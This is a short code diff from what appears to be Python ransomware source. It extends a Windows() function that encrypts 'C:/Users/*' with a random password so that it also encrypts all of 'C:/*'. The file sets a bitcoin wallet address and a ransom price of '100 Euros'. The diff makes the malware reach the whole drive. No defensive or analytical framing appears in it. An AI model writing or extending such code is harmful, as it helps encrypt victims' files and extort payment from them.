@@ -13,12 +13,14 @@ import pdb
 def Windows():
     path=('C:')
     text1=('C:/Users/*')
+    text2=('C:/*')
     verif=""
     s = string.ascii_lowercase + string.digits
     pwd = str(''.join(random.sample(s, 8)))
     t=string.ascii_lowercase
     idd =str(''.join(random.sample(s, 10)))
     crypt(text1, pwd, path, bitcoin, price,verif)
+    crypt(text2, pwd, path, bitcoin, price,verif)
 
 bitcoin='18SXEt2zLcmYKCbZ6fx36QrmA2NuPAE9kq'
 price='100 Euros'
